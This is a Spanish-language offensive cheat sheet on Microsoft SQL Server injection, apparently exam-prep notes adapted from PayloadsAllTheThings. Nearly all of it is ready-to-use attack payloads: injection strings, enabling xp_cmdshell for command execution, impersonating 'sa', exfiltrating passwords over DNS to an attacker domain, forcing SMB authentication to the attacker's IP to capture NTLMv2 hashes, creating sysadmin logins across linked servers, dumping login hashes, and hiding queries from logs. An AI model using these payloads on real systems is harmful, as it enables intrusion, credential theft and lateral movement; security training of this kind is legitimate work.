# Chuleta — MSSQL Injection

> Fuente: [PayloadsAllTheThings — MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
> Complementa `Tecnicas/mssql.md`, `Tecnicas/sqli.md` y la sección 1433 de `02-enumeracion-servicios.md`.
>
> **Deliberadamente sin `sqlmap`**: está prohibido en el examen (herramienta automática). Todo
> esto se hace a mano. Ver `00-reglas-examen.md`.

---

## Bases por defecto y comentarios

| Base | Nota |
| --- | --- |
| `pubs` | no está en MSSQL 2005 |
| `model`, `msdb`, `tempdb`, `northwind` | en todas las versiones |
| `information_schema` | desde MSSQL 2000 |

| Comentario | Uso |
| --- | --- |
| `--` | comentario SQL |
| `/* ... */` | comentario C |
| `;%00` | null byte |

---

## Enumeración

```sql
SELECT @@version                 -- versión
SELECT DB_NAME()                 -- base actual
SELECT user_name()               -- usuario
SELECT is_srvrolemember('sysadmin');   -- ¿sysadmin?
```

```sql
-- Bases de datos
SELECT name FROM master..sysdatabases

-- Tablas de una base
SELECT name FROM <DB>..sysobjects WHERE xtype='U'

-- Columnas de una tabla
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='Users')

-- Datos
SELECT UserId, UserName FROM Users
```

---

## Tipos de inyección

### Union based

```sql
' UNION SELECT 1,name,3 FROM master..sysdatabases-- -
```

### Error based

```sql
AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~'))-- -
AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~'))-- -
AND 1337=CONCAT('~',(SELECT @@version),'~')-- -
CAST((SELECT @@version) AS INT)
```

### Blind based

```sql
AND LEN(SELECT TOP 1 username FROM tblusers)=5-- -
AND ASCII(SUBSTRING((SELECT TOP 1 username FROM tblusers),1,1))=97-- -
```

### Time based

```sql
'; WAITFOR DELAY '0:0:10'-- -
```

### Stacked queries

MSSQL permite **consultas apiladas** (varias sentencias). Muy útil para habilitar
`xp_cmdshell` cuando no ves la salida (redirigila a un archivo).

```sql
SELECT 'A'SELECT 'B'SELECT 'C'

'; exec('update[users]set[password]=''a''')-- -

-- Habilitar xp_cmdshell apilando
'; exec('sp_configure ''show advanced options'',''1'' reconfigure')
   exec('sp_configure ''xp_cmdshell'',''1'' reconfigure')-- -
```

---

## Ejecución de comandos

### xp_cmdshell

```sql
EXEC xp_cmdshell 'whoami';
EXEC master.dbo.xp_cmdshell 'cmd.exe /c dir c:\';

-- Habilitar (requiere sysadmin)
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
```

### Python (SQL Server 2017+, ejecuta como otra cuenta de servicio)

```sql
EXECUTE sp_execute_external_script @language=N'Python',
        @script=N'print(__import__("os").system("whoami"))'
EXECUTE sp_execute_external_script @language=N'Python',
        @script=N'print(open("C:\\inetpub\\wwwroot\\web.config").read())'
```

### Impersonación (`EXECUTE AS`) — sin ser sysadmin

```sql
-- ¿A quién puedo impersonar?
SELECT DISTINCT b.name FROM sys.server_permissions a
  INNER JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id
  WHERE a.permission_name='IMPERSONATE';

EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;   -- y desde ahí, xp_cmdshell
```

> Encadenable: impersonar → ver si el nuevo contexto puede impersonar a otro.

---

## Manejo de archivos

```sql
-- Leer (requiere ADMINISTER BULK OPERATIONS)
OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB)

-- Escritura (procedimiento para escribir strings a archivo)
execute spWriteStringToFile 'contents', 'C:\path\', 'file'
```

---

## Out of Band (OOB)

### Exfiltración por DNS

```sql
-- Requiere VIEW SERVER STATE
1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel',
    '\\'+(select pass from users where id=1)+'.[ATTACKER.DOMAIN.TLD]\1.xem',null,null))

-- Requiere CONTROL SERVER
1 (select 1 where exists(select * from fn_get_audit_file(
    '\\'+(select pass from users where id=1)+'.[ATTACKER.DOMAIN.TLD]\',default,default)))
```

### UNC path → capturar hash NTLMv2 (Responder)

MSSQL soporta `xp_dirtree` y variantes que provocan una autenticación SMB saliente.

```sql
1'; use master; exec xp_dirtree '\\<TU_IP>\SHARE';-- 
xp_dirtree '<\\TU_IP>\file'
xp_fileexist '\\<TU_IP>\file'
BACKUP LOG [TESTING] TO DISK = '\\<TU_IP>\file'
BACKUP DATABASE [TESTING] TO DISK = '\\<TU_IP>\file'
```

Con `responder -I tun0` en tu Kali capturás el hash del **service account de MSSQL** para
crackear o Pass-the-Hash.

---

## Trusted Links (linked servers)

Permiten ejecutar consultas e incluso procedimientos remotos en otra instancia (funciona
incluso entre **trusts de bosque**).

```sql
-- Enumerar links
select * from master..sysservers

-- Consultar a través del link
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
select version from openquery("linkedserver", 'select @@version as version')

-- Encadenar links
select version from openquery("link1",
    'select version from openquery("link2","select @@version as version")')

-- Ejecutar comandos en el servidor remoto
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
select 1 from openquery("linkedserver",
    'select 1;exec master..xp_cmdshell "dir c:"')

-- Crear un usuario sysadmin en el servidor remoto
EXECUTE('EXECUTE(''CREATE LOGIN User WITH PASSWORD = ''''Password123'''' '')
    AT "DOMAIN\SQL01"') AT "DOMAIN\SQL02"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''User'''', ''''sysadmin'''' '')
    AT "DOMAIN\SQL01"') AT "DOMAIN\SQL02"
```

---

## Privilegios y credenciales

```sql
SELECT * FROM fn_my_permissions(NULL,'SERVER');
SELECT * FROM fn_my_permissions(NULL,'DATABASE');

-- Hacerse DBA
EXEC master.dbo.sp_addsrvrolemember 'User','sysadmin';
```

Hashes de logins SQL:

| Versión | Hashcat | Query |
| --- | --- | --- |
| MSSQL 2000 | `-m 131` | `SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins` |
| MSSQL 2005 | `-m 132` | `SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins` |

---

## OPSEC

`sp_password` oculta la consulta de los logs:

```sql
' AND 1=1--sp_password
-- El log muestra: "'sp_password' was found in the text of this event..."
```

---

## Encadenar con el resto del playbook

1. Foothold MSSQL → `mssqlclient.py -windows-auth` o `nxc mssql ... -x`.
2. `xp_cmdshell` / impersonación → ejecución.
3. El service account suele tener **`SeImpersonatePrivilege`** → escalar con **Potato**
   (ver `cheatsheets/potatoes.md`).
4. UNC path → `Responder` → hash → crackeo o Pass-the-Hash.
5. Trusted links → movimiento lateral hacia otra instancia.
